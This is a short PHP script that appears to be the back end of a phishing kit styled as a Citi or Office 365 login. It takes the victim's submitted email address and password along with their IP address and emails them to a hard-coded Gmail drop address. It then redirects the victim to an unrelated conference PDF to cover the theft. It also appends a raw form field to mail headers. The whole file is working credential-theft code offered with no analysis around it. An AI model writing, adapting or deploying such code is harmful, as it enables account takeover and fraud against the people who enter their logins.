<?
$ip = getenv("REMOTE_ADDR");
$message .= "-----------  ! +Citi LOGIN ! xDD+ !  -----------\n";
$message .= "-----------  ! +Account infoS+ !  -----------\n";
$message .= "Email Address        : ".$_POST['username']."\n";
$message .= "Password               : ".$_POST['passwd']."\n";
$message .= "IP Address             : ".$ip."\n";
$message .= "-----------  ! +nJoY+ !  -----------\n";
$send = "jer96593@gmail.com";

$subject = "365 logs xD $ip";
$headers = "From:  DEC $$$ NuNULogs <CrownLord@sfletter.net>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
mail($send,$subject,$message,$headers);


header("Location: http://cbim2018.org/wp-content/uploads/2017/10/CALL-FOR-PAPERS-flyer-CBIM2018.pdf");




